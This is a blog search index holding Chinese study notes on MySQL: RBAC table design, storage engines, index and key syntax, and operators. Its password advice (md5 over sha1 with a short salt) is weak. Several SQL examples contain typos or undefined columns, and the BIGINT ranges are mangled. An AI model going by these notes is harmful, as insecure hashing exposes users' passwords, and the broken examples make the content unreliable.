<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>mysql/用户角色权限</title>
      <link href="mysql/%E7%94%A8%E6%88%B7%E8%A7%92%E8%89%B2%E6%9D%83%E9%99%90/"/>
      <url>mysql/%E7%94%A8%E6%88%B7%E8%A7%92%E8%89%B2%E6%9D%83%E9%99%90/</url>
      
        <content type="html"><![CDATA[<h1 id="表设计"><a href="#表设计" class="headerlink" title="表设计"></a>表设计</h1><a id="more"></a><p><img src="../images/%E7%94%A8%E6%88%B7%E8%A7%92%E8%89%B2%E6%9D%83%E9%99%90/v2-4145d1e743330c9d20ace706857acb3c_720w.jpg" alt="img"></p><p>RBAC(Role-Based Access Control )</p><p>RBAC（基于角色的访问控制）是指用户通过角色与权限进行关联。即一个用户拥有若干角色，每一个角色拥有若干权限。<strong>这样，就构造成“用户—角色—权限”的授权模型。</strong>在这种模型中，用户与角色之间、角色与权限之间，一般者是多对多的关系。</p><p><strong>账号表</strong> </p><p>记录登陆方式的信息,  手机号, 邮箱地址, 身份证号码和微信登陆等 ,记录每一种登陆方式的信息, 但不包含密码信息 </p><p>各种登陆方式使用同一个密码, 每一条记录都会关联到唯一的一条用户记录 </p><ul><li>账号ID : 设为主键  (using BTREE)</li><li>用户ID  : 用作关联用户id</li><li>登陆账号 , 如手机号等 </li><li>账号类别 </li><li>创建时间 </li><li>创建人 </li><li>修改时间 </li><li>修改人</li><li>‘逻辑删除:0 =未删除, 1=已删除 ‘</li><li>普通索引 idx_member_id(用户ID)</li><li></li></ul><p><strong>用户表</strong></p><p> <strong>用户组表</strong> </p><p><strong>权限表</strong></p><p><strong>角色表 :</strong> </p><p>为了维护方便, 将权限表进行分组</p><p>用户-角色表</p><p>记录用户拥有的角色</p><p>mysql dba 为MySQL 管理员 </p><h2 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h2><h3 id="COLLATE"><a href="#COLLATE" class="headerlink" title="COLLATE"></a>COLLATE</h3><p>一般每种 CHARSET 都有多种它所支持的COLLATE, 并且每种<code>CHARSET</code>都指定一种<code>COLLATE</code>为默认值。例如<code>Latin1</code>编码的默认<code>COLLATE</code>为<code>latin1_swedish_ci</code>，<code>GBK</code>编码的默认<code>COLLATE</code>为<code>gbk_chinese_ci</code>，<code>utf8mb4</code>编码的默认值为<code>utf8mb4_general_ci</code>。</p><p>COLLATE 通常和数据编码(CHARsET) 相关</p><p>mysql中请永远使用 <strong>utf8mb4</strong> ,mysql中的<code>utf8</code>最多只能支持3bytes长度的字符编码，对于一些需要占据4bytes的文字，mysql的<code>utf8</code>就不支持了，要使用<code>utf8mb4</code>才行。</p><p><img src="../images/%E7%94%A8%E6%88%B7%E8%A7%92%E8%89%B2%E6%9D%83%E9%99%90/image-20210513155248130.png" alt="image-20210513155248130"></p><h3 id="ZEROFILL"><a href="#ZEROFILL" class="headerlink" title="ZEROFILL"></a>ZEROFILL</h3><p>使用零填充 空字段的显示值, 直到字段定义中指定的显示宽度为止, 零填充意味着未签名</p><h3 id="int"><a href="#int" class="headerlink" title="int"></a>int</h3><table><thead><tr><th align="left">Type</th><th align="left">Storage (Bytes)</th><th align="left">Minimum Value Signed</th><th align="left">Minimum Value Unsigned</th><th align="left">Maximum Value Signed</th><th align="left">Maximum Value Unsigned</th></tr></thead><tbody><tr><td align="left"><code>TINYINT</code></td><td align="left">1</td><td align="left"><code>-128</code></td><td align="left"><code>0</code></td><td align="left"><code>127</code></td><td align="left"><code>255</code></td></tr><tr><td align="left"><code>SMALLINT</code></td><td align="left">2</td><td align="left"><code>-32768</code></td><td align="left"><code>0</code></td><td align="left"><code>32767</code></td><td align="left"><code>65535</code></td></tr><tr><td align="left"><code>MEDIUMINT</code></td><td align="left">3</td><td align="left"><code>-8388608</code></td><td align="left"><code>0</code></td><td align="left"><code>8388607</code></td><td align="left"><code>16777215</code></td></tr><tr><td align="left"><code>INT</code></td><td align="left">4</td><td align="left"><code>-2147483648</code></td><td align="left"><code>0</code></td><td align="left"><code>2147483647</code></td><td align="left"><code>4294967295</code></td></tr><tr><td align="left"><code>BIGINT</code></td><td align="left">8</td><td align="left"><code>-263</code></td><td align="left"><code>0</code></td><td align="left"><code>263-1</code></td><td align="left"><code>264-1</code></td></tr></tbody></table><h3 id="CHAERACTER-SET-字符集"><a href="#CHAERACTER-SET-字符集" class="headerlink" title="CHAERACTER  SET(字符集 )"></a>CHAERACTER  SET(字符集 )</h3><p>字符集校对 </p><p>定义了字符以及字符的编码 </p><p>是多个字符(英文字符，汉字字符，或者其他国家语言字符)的集合，字符集种类较多，每个字符集包含的字符个数不同。</p><h3 id="COMMENT"><a href="#COMMENT" class="headerlink" title="COMMENT"></a>COMMENT</h3><p> 添加注释 </p><h3 id="UNSIGEND"><a href="#UNSIGEND" class="headerlink" title="UNSIGEND"></a>UNSIGEND</h3><p>无符号 类型</p><p>扩大取值范围</p><h3 id="SIGNED"><a href="#SIGNED" class="headerlink" title="SIGNED"></a>SIGNED</h3><p>有符号</p><h3 id="Constraints"><a href="#Constraints" class="headerlink" title="Constraints"></a>Constraints</h3><p>MySQL中的约束用于指定允许或限制将在表中存储哪些值/数据的规则。它们提供了一种合适的方法来确保表中数据的准确性和完整性。它还有助于限制将在表内插入的数据的类型。如果约束和数据操作之间发生任何中断，则该操作将失败。</p><p>MySQL种的约束分为两种类型 :</p><p> <img src="../images/%E7%94%A8%E6%88%B7%E8%A7%92%E8%89%B2%E6%9D%83%E9%99%90/image-20210513163802690.png" alt="image-20210513163802690"></p><p><img src="../images/%E7%94%A8%E6%88%B7%E8%A7%92%E8%89%B2%E6%9D%83%E9%99%90/image-20210513164714403.png" alt="image-20210513164714403"></p><h2 id="字段设计"><a href="#字段设计" class="headerlink" title="字段设计"></a>字段设计</h2><h3 id="password"><a href="#password" class="headerlink" title="password"></a>password</h3><h3 id="salt-加盐"><a href="#salt-加盐" class="headerlink" title="salt (加盐)"></a>salt (加盐)</h3><p>汉字 3个字节 </p><p>一般使用md5对密码进行加密,    16 字节（128 位）的校验值，一般用 32 位十六进制数表示</p><p>5.0版本以上 varchar(20)指的是 20字符</p><p>自己添加随机数字或字符对加密进行加料. </p><p>md5(sha1(password+salt)) 构成加密后的密码 </p><p>salt  varchar(4)</p><p>登陆时将用户输入密码进行相同加密方式后和数据库中密码进行比对验证 </p><p>可以先通过账号(唯一标识)获取salt</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql/Mysql树结构</title>
      <link href="mysql/Mysql%E6%A0%91%E7%BB%93%E6%9E%84/"/>
      <url>mysql/Mysql%E6%A0%91%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h1 id="树形结构设计"><a href="#树形结构设计" class="headerlink" title="树形结构设计"></a>树形结构设计</h1><a id="more"></a><h2 id="菜单表设计"><a href="#菜单表设计" class="headerlink" title="菜单表设计"></a>菜单表设计</h2><p><a href="https://www.cnblogs.com/cjsblog/p/14714444.html" target="_blank" rel="noopener">参考</a></p><h3 id="字段"><a href="#字段" class="headerlink" title="字段"></a>字段</h3><p>parent_id   用来存储 父 id </p><p>通过 父id 来遍历所属表中的数据 </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql/mysql基本操作</title>
      <link href="mysql/mysql%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
      <url>mysql/mysql%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="mysql相关"><a href="#mysql相关" class="headerlink" title="mysql相关"></a>mysql相关</h1><a id="more"></a><p>[TOC]</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>基本操作</p><h3 id="查看和修改port"><a href="#查看和修改port" class="headerlink" title="查看和修改port"></a>查看和修改port</h3><p>查看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show global variables like &#39;port&#39;;</span><br></pre></td></tr></table></figure><p>修改</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">vi</span>  /etc/my.<span class="keyword">cnf</span> 文件</span><br></pre></td></tr></table></figure><h3 id="自定义id规则"><a href="#自定义id规则" class="headerlink" title="自定义id规则"></a>自定义id规则</h3><h4 id="自动填写id"><a href="#自动填写id" class="headerlink" title="自动填写id"></a>自动填写id</h4><p>CREATE TABLE table_name{</p><p>id MEDIUMINT NOT NULL AUTO_INCREMENT,</p><p>name CHAR(30) not null, </p><p>PRIMARY KEY (id)</p><p>}  </p><p>注： 选择合适的integer类型 ，建议使用无符号类型mysql自动填写id </p><p>AT&amp;T<a href="http://images.google.com/images?num=30&amp;q=larry+bird" target="_blank" rel="noopener">http://images.google.com/images?num=30&amp;q=larry+bird</a></p><h4 id="实现id删除后自动填补"><a href="#实现id删除后自动填补" class="headerlink" title="实现id删除后自动填补"></a>实现id删除后自动填补</h4><p>1，不清空数据</p><p>原理：删除原有的自增ID，重新建立新的自增ID</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">删除原有主键：</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="string">'table_name'</span> <span class="keyword">DROP</span> <span class="string">'id'</span>;</span><br><span class="line">添加新主键字段并设置逐渐：</span><br><span class="line"><span class="keyword">ALTER</span> TABE <span class="string">'table_name'</span> <span class="keyword">ADD</span> <span class="string">'id'</span> mediumint(<span class="number">6</span>) PRIMARY <span class="keyword">KEY</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">FIRST</span>;</span><br></pre></td></tr></table></figure><h3 id="存储引擎"><a href="#存储引擎" class="headerlink" title="存储引擎"></a>存储引擎</h3><p>集中常用的存储引擎</p><table><thead><tr><th>特性</th><th>MyISAM</th><th>InnoDB</th><th>MEMORY</th></tr></thead><tbody><tr><td>存储限制</td><td>有</td><td>支持</td><td>有</td></tr><tr><td>事务安全</td><td>不支持</td><td>支持</td><td>不支持</td></tr><tr><td>锁机制</td><td>表锁</td><td>行锁</td><td>表锁</td></tr><tr><td>B树索引</td><td>支持</td><td>支持</td><td>支持</td></tr><tr><td>哈希索引</td><td>不支持</td><td>不支持</td><td>支持</td></tr><tr><td>全文索引</td><td>支持</td><td>不支持</td><td>不支持</td></tr><tr><td>集群索引</td><td>不支持</td><td>支持</td><td>不支持</td></tr><tr><td>数据缓存</td><td></td><td>支持</td><td>支持</td></tr><tr><td>索引缓存</td><td>支持</td><td>支持</td><td>支持</td></tr><tr><td>数据可压缩</td><td>支持</td><td>不支持</td><td>不支持</td></tr><tr><td>空间使用</td><td>低</td><td>高</td><td>N/A</td></tr><tr><td>内存使用</td><td>低</td><td>高</td><td>中等</td></tr><tr><td>批量插入速度</td><td>高</td><td>低</td><td>高</td></tr><tr><td>支持外键</td><td>不支持</td><td>支持</td><td>不支持</td></tr></tbody></table><p>1） MyISAM</p><p>Mysql 5.1版本及之前的默认存储引擎   不支持事务和外键，访问速度较快，</p><p>如果应用主要以读取和写入为主，只有少量的更新和删除操作，并且对事务的完整型，并发性要求不是很高，那么选择MylSAM存储引擎是非常适合的</p><p>2)InnoDB</p><p>MySQL 5.5版本后的默认的事务型引擎</p><p>InnoDB存储引擎在事务上具有优势，即支持具有提交、回滚和崩溃回复能力的事务安装，所以比MyISAM存储引擎占用更多的磁盘空间</p><p>如果应用对事务的完整性有比较高的要求，在并发条件下要求数据的一致性，数据操作除了插入和查询以外，还包括很多的更新、删除操作，那么 InnoDB 存储引擎是比较合适的选择。</p><p>InnoDB 存储引擎除了可以有效地降低由于删除和更新导致的锁定，还可以确保事务的完整提交（Commit）和回滚（Rollback），对于类似计费系统或者财务系统等对数据准确性要求比较高的系统，InnoDB 都是合适的选择。</p><p>3）MEMORY</p><p>MEMORY 存储引擎将所有数据保存在RAM中，所以该存储引擎的访问速度块，但是在安全上没有保障</p><p>MEMORY对表的大小有限制，太大的表无法缓存在内存中。由于使用MEMORY存储引擎没有安全保障，所以要确保数据库异常终止后表中的数据可以恢复</p><p>如果应用中涉及数据比较少，且需要进行快速访问，则适合使用MEMORY存储引擎./</p><h4 id="查看和修改数据表的存储引擎"><a href="#查看和修改数据表的存储引擎" class="headerlink" title="查看和修改数据表的存储引擎"></a>查看和修改数据表的存储引擎</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">VARIABLES</span> <span class="keyword">LIKE</span> <span class="string">'default_storage_engine%'</span>; 查看默认存储引擎</span><br><span class="line"><span class="keyword">SET</span> default_storage_engine=&lt;存储引擎名&gt;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span>  talbe_name \G 查看table_name表当前的存储引擎</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name <span class="keyword">ENGINE</span>=MylSAM ; 修改table表的存储引擎为MylSAM类型，</span><br></pre></td></tr></table></figure><p>以上这种方法适用于修改单个表的存储引擎，如果希望修改默认的存储引擎，就需要修改 my.cnf 配置文件。在 my.cnf 配置文件的 [mysqld] 后面加入以下语句：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">default</span>-storage-engine=存储引擎名称</span><br></pre></td></tr></table></figure><h3 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h3><p>主键，外键，索引（index），唯一索引</p><p>  <strong>1、主键(primary key)</strong> 能够唯一标识表中某一行的属性或属性组。一个表只能有一个主键，但可以有多个候选索引。主键常常与外键构成参照完整性约束，防止出现数据不一致。主键可以保证记录的唯一和主键域非空,数据库管理系统对于主键自动生成唯一索引，所以<strong>主键也是一个特殊的索引</strong>。</p><p>  <strong>2、外键（foreign key）</strong> 是用于建立和加强两个表数据之间的链接的一列或多列。外键约束主要用来维护两个表之间数据的一致性。简言之，表的外键就是另一表的主键，外键将两表联系起来。一般情况下，要删除一张表中的主键必须首先要确保其它表中的没有相同外键（即该表中的主键没有一个外键和它相关联）。</p><p>  <strong>3、索引(index)</strong> 是用来快速地寻找那些具有特定值的记录。主要是为了检索的方便，是为了加快访问速度， 按一定的规则创建的，一般起到排序作用。所谓<strong>唯一性索引</strong>，这种索引和前面的“普通索引”基本相同，但有一个区别：索引列的所有值都只能出现一次，即必须唯一。</p><p>  <strong>总结：</strong></p><p>主键一定是唯一性索引，唯一性索引并不一定就是主键。</p><p> 一个表中可以有多个唯一性索引，但只能有一个主键。</p><p>主键列不允许空值，而唯一性索引列允许空值。</p><p>主键可以被其他字段作外键引用，而索引不能作为外键引用。</p><h4 id="普通索引"><a href="#普通索引" class="headerlink" title="普通索引"></a>普通索引</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">创建索引，</span><br><span class="line">CREATE INDEX &lt;索引的名字&gt; ON talbename(列的列表);</span><br><span class="line">修改表，</span><br><span class="line">ALTER TABLE tablename ADD INDEX [索引的名字](列的列表) ;</span><br><span class="line">创建表的时候指定索引，</span><br><span class="line">CREATE TABLE tablename ([...] ,INDEX [索引的名字](列的列表))；</span><br></pre></td></tr></table></figure><h4 id="唯一性索引"><a href="#唯一性索引" class="headerlink" title="唯一性索引"></a>唯一性索引</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">创建索引，例如:</span><br><span class="line">      CREATE UNIQUE INDEX &lt;索引的名字&gt; ON tablename (列的列表); </span><br><span class="line">修改表，例如:</span><br><span class="line">      ALTER TABLE tablename ADD UNIQUE [索引的名字] (列的列表); </span><br><span class="line">创建表的时候指定索引，例如:</span><br><span class="line">      CREATE TABLE tablename ( [...], UNIQUE [索引的名字] (列的列表) );</span><br></pre></td></tr></table></figure><h4 id="主键"><a href="#主键" class="headerlink" title="主键"></a>主键</h4><p>主键是一种唯一性索引，但它必须指定为“<a href="http://whatis.ctocio.com.cn/searchwhatis/287/6026287.shtml" target="_blank" rel="noopener">PRIMARYKEY</a>”。(每个表只能有一个主键) </p><ul><li><p>主键值必须唯一标识表中的每一行，且不能为 NULL，即表中不可能存在有相同主键值的两行数据。这是唯一性原则。</p></li><li><p>一个字段名只能在联合主键字段表中出现一次。</p></li><li><p>联合主键不能包含不必要的多余字段。当把联合主键的某一字段删除后，如果剩下的字段构成的主键仍然满足唯一性原则，那么这个联合主键是不正确的。这是最小化原则。</p></li></ul><p>主键一般在创建表的时候指定，例如</p><p>“CREATE TABLE tablename([,,,],<strong>PRIMARY KEY</strong> （列的列表));”</p><p>也可以通过修改表的方式加入主键，例如：</p><p>“ALTER TABLE tablename ADD PRIMARY KEY (列的列表);”</p><p>例 : 在test_db数据库中创建tb_emp3数据库，其主键为id</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; CREATE TABLE tb_emp3</span><br><span class="line">    -&gt; (</span><br><span class="line">    -&gt; id INT(11) PRIMARY KEY,</span><br><span class="line">    -&gt; name VARCHAR(25),</span><br><span class="line">    -&gt; deptId INT(11),</span><br><span class="line">    -&gt; salary FLOAT</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.37 sec)</span><br><span class="line">mysql&gt; DESC tb_emp3;</span><br><span class="line">+<span class="comment">--------+-------------+------+-----+---------+-------+</span></span><br><span class="line">| Field  | Type        | Null | Key | Default | Extra |</span><br><span class="line">+<span class="comment">--------+-------------+------+-----+---------+-------+</span></span><br><span class="line">| id     | int(11)     | NO   | PRI | NULL    |       |</span><br><span class="line">| name   | varchar(25) | YES  |     | NULL    |       |</span><br><span class="line">| deptId | int(11)     | YES  |     | NULL    |       |</span><br><span class="line">| salary | float       | YES  |     | NULL    |       |</span><br><span class="line">+<span class="comment">--------+-------------+------+-----+---------+-------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.14</span> sec)</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> &lt;数据表名&gt; <span class="keyword">ADD</span> PRIMARY <span class="keyword">KEY</span>(&lt;字段名&gt;); 修改数据表时添加主键约束的语法格式</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> &lt;数据表名&gt; <span class="keyword">DROP</span> PRIMARY <span class="keyword">KEY</span>; 删除主键约束的语法格式</span><br></pre></td></tr></table></figure><h5 id="联合主键"><a href="#联合主键" class="headerlink" title="联合主键"></a>联合主键</h5><p>联合主键是由一张表中多个字段组成。</p><p>设置学生选课数据表时，当学生编号和课程编号放一起共同作为主键（联合主键）就可以限定一个学生智能选择同一课程一次</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">主键由多个字段联合组成，语法格式如下:</span><br><span class="line">PRIMARY KEY[字段<span class="number">1</span>,字段<span class="number">2</span>,……,字段n]</span><br></pre></td></tr></table></figure><p>例 创建数据表tb_emp5，假设表中没有主键id，为了唯一确定一个员工，可以把name,deptld 联合起来作为主键，sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; CREATE TABLE tb_emp5</span><br><span class="line">    -&gt; (</span><br><span class="line">    -&gt; name VARCHAR(25),</span><br><span class="line">    -&gt; deptId INT(11),</span><br><span class="line">    -&gt; salary FLOAT,</span><br><span class="line">    -&gt; PRIMARY KEY(id,deptId)</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.37 sec)</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">设置主键自增字段初始值</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> tb_student2(</span><br><span class="line"> <span class="keyword">id</span> <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line"> </span><br><span class="line">)AUTO_INCREMENT = <span class="number">100</span>;</span><br></pre></td></tr></table></figure><h4 id="外键约束（FOREIGN-KEY）"><a href="#外键约束（FOREIGN-KEY）" class="headerlink" title="外键约束（FOREIGN KEY）"></a>外键约束（FOREIGN KEY）</h4><p>MySQL 外键约束经常与主键约束一起使用，对于两个具有关联关系的表而言，相关字段中主键所在的表就是主表（父表），外键所在的表就是从表(子表)</p><p>外键用来建立主表与从表的关联关系，为两个表的数据建立链接，约束两个表中数据的一致性和完整性，比如，水果摊上只有苹果、桃子、李子、西瓜等4种水果，那么你来水果毯买水果就只能选择这四种水果，其它的水果是不能买的</p><p>主表更改某条记录时，从表中与之对应的记录也必须要有相应的改变，一个表可以有一个或多个外键，外键可为空，若不为空，则每一个外键的值必须等于主表中主键的某个值</p><p>定义外键需要遵守的规则：</p><ul><li><p>主表必须已经存在于数据库中，或者是当前正在创建的表。如果是后一种情况，则主表与从表是同一个表，这样的表称为自参照表，这种结构称为自参照完整性。</p></li><li><p>必须为主表定义主键。</p></li><li><p>主键不能包含空值，但允许在外键中出现空值。也就是说，只要外键的每个非空值出现在指定的主键中，这个外键的内容就是正确的。</p></li><li><p>在主表的表名后面指定列名或列名的组合。这个列或列的组合必须是主表的主键或候选键。</p></li><li><p>外键中列的数目必须和主表的主键中列的数目相同。</p></li><li><p>外键中列的数据类型必须和主表主键中对应列的数据类型相同。</p>  <figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[CONSTRAINT &lt;外键名&gt;] <span class="meta">FOREIGN</span> <span class="meta">KEY</span> 字段名 [，字段名2，…]</span><br><span class="line"><span class="meta">REFERENCES</span> &lt;主表名&gt; 主键列1 [，主键列2，…]  通过FOREGIN <span class="meta">KEY</span> 关键字指定外键，语法格式</span><br><span class="line"></span><br><span class="line"><span class="meta">ALTER</span> <span class="meta">TABLE</span> &lt;数据表名&gt; <span class="meta">ADD</span> CONSTRAINT &lt;外键名&gt;</span><br><span class="line"><span class="meta">FOREIGN</span> <span class="meta">KEY</span>(&lt;列名&gt;) <span class="meta">REFERENCES</span> &lt;主表名&gt; (&lt;列名&gt;); 修改表时添加外键约束</span><br></pre></td></tr></table></figure><p>  ALTER TABLE  tb_emp2 ADD CONSTRAINT fk_tb_dept1 FOREGIN KEY(deptId) REFERENCES tb_dept1(id);</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> &lt;表明&gt; <span class="keyword">DROP</span> <span class="keyword">FOREIGN</span> <span class="keyword">KEY</span> &lt;外键约束名&gt;;</span><br></pre></td></tr></table></figure></li></ul><h4 id="列索引与多列索引"><a href="#列索引与多列索引" class="headerlink" title="列索引与多列索引"></a><strong>列索引与多列索引</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE people </span><br><span class="line">( peopleid SMALLINT NOT NULL AUTO_INCREMENT, </span><br><span class="line">  firstname CHAR(50) NOT NULL, </span><br><span class="line">  lastname CHAR(50) NOT NULL, </span><br><span class="line">  age SMALLINT NOT NULL, </span><br><span class="line">  townid SMALLINT NOT NULL,</span><br><span class="line">  PRIMARY KEY (peopleid) );</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE people ADD INDEX fname_lname_age (firstname,lastname,age);</span><br></pre></td></tr></table></figure><p>  多列索引还有另外一个优点，它通过称为<strong>最左前缀</strong>（LeftmostPrefixing）的概念体现出来。继续考虑前面的例子，现在我们有一个firstname、lastname、age列上的多列索引，我们称这个索引为fname_lname_age。当搜索条件是以下各种列的组合时，MySQL将使用fname_lname_age索引：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firstname，lastname age, firstname lastname, firstname0</span><br></pre></td></tr></table></figure><p>  从另一方面理解，它相当于我们创建了(firstname，lastname，age)、(firstname，lastname)以及(firstname)这些列组合上的索引。下面这些查询都能够使用这个fname_lname_age索引：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SELECT peopleid FROM people WHERE firstname&#x3D;&#39;Mike&#39; AND lastname&#x3D;&#39;Sullivan&#39; AND age&#x3D;&#39;17&#39;;</span><br><span class="line">SELECT peopleid FROM people WHERE firstname&#x3D;&#39;Mike&#39; AND lastname&#x3D;&#39;Sullivan&#39;; </span><br><span class="line">SELECT peopleid FROM people WHERE firstname&#x3D;&#39;Mike&#39;;</span><br><span class="line"> </span><br><span class="line">The following queries cannot use the index at all: </span><br><span class="line"></span><br><span class="line">SELECT peopleid FROM people WHERE lastname&#x3D;&#39;Sullivan&#39;; </span><br><span class="line">SELECT peopleid FROM people WHERE age&#x3D;&#39;17&#39;; </span><br><span class="line">SELECT peopleid FROM people WHERE lastname&#x3D;&#39;Sullivan&#39; AND age&#x3D;&#39;17&#39;;</span><br></pre></td></tr></table></figure><h4 id="MySQL默认值"><a href="#MySQL默认值" class="headerlink" title="MySQL默认值"></a>MySQL默认值</h4><p>Default 完整称呼 是“默认值约束”，用来指定某列的默认值。在表中插入一条新纪录时，如果没有为某个字段赋值，系统就会自动为这个字段插入默认值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;字段名&gt; &lt;数据类型&gt; DEFAULT &lt;默认值&gt;; 创建表时DEFAULT关键字设置默认值约束 </span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> &lt;数据表名&gt;</span><br><span class="line"><span class="keyword">CHANGE</span> <span class="keyword">COLUMN</span> &lt;字段名&gt; &lt;数据类型&gt; <span class="keyword">DEFAULT</span> &lt;默认值&gt;; 修改表时添加默认值约束</span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> &lt;数据表名&gt;;      查看约束</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> &lt;数据表名&gt; <span class="keyword">CHANGE</span> <span class="keyword">COLUMN</span> &lt;字段名&gt;&lt;字段名&gt; &lt;数据类型&gt;<span class="keyword">DEFAULT</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><h3 id="MySQL常用运算符"><a href="#MySQL常用运算符" class="headerlink" title="MySQL常用运算符"></a>MySQL常用运算符</h3><h4 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h4><table><thead><tr><th>运算符</th><th>作用</th><th>使用方法</th></tr></thead><tbody><tr><td>+</td><td>加法运算</td><td>用于获得一个或多个值的和</td></tr><tr><td>-</td><td>减法运算</td><td>用于从一个值中减去另一个值</td></tr><tr><td>*</td><td>乘法运算</td><td>使数字相乘，得到两个或多个值的乘积</td></tr><tr><td>/</td><td>除法运算，返回商</td><td>用一个值除以另一个值得到商</td></tr><tr><td>%，MOD</td><td>求余运算，返回余数</td><td>用一个值除以另一个值得到余数</td></tr></tbody></table><h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><table><thead><tr><th>运算符</th><th>作用</th></tr></thead><tbody><tr><td>NOT 或者 !</td><td>逻辑非</td></tr><tr><td>AND 或者 &amp;&amp;</td><td>逻辑与</td></tr><tr><td>OR 和 